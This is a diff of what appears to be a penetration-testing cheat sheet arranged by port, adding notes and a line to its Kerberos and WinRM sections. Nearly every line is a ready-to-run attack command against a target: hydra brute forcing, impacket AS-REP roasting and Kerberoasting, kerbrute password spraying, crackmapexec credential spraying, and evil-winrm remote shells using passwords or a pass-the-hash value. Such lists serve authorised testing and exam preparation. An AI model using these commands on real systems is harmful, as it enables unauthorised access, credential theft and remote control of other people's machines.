@@ -46,8 +46,8 @@ hydra -L /seclists/Usernames/Names/names.txt -p $password -u -f $rhost -s 43649 
 
 ### Port 88 (Kerberos)
 impacket-GetNPUsers $domain/$user
-impacket-GetNPUsers -request -dc-ip $rhost $domain/$user -outputfile $user-hash.asrep
-impacket-GetUserSPNs -request -dc-ip $rhost $domain/$user
+impacket-GetNPUsers -request -dc-ip $rhost $domain/$user -outputfile $user-hash.asrep # Rubeus can be used with low priv
+impacket-GetUserSPNs -request -dc-ip $rhost $domain/$user # Rubeus can be used with low priv
 impacket-GetTGT $domain/$user:$password
 impacket-findDelegation $domain/$user:$password@$rhost
 kerbrute passwordspray -d $shortdomain --dc $rhost users.txt $password
@@ -86,6 +86,7 @@ mysql -h $rhost -u $user -p$password -e "select user,host from mysql.user;"
 ### Port 5985 (WinRM)
 evil-winrm -i $rhost -u $user -p $password
 evil-winrm -i $rhost -u $user -H Hash-value
+crackmapexec winrm $rhost -u users.txt -p passwords.txt
 crackmapexec winrm $rhost -u users.txt -H hashes.txt --continue-on-success
 evil-winrm -i $rhost -u $user -H '19a3a7550ce8c505c2d4608'
 
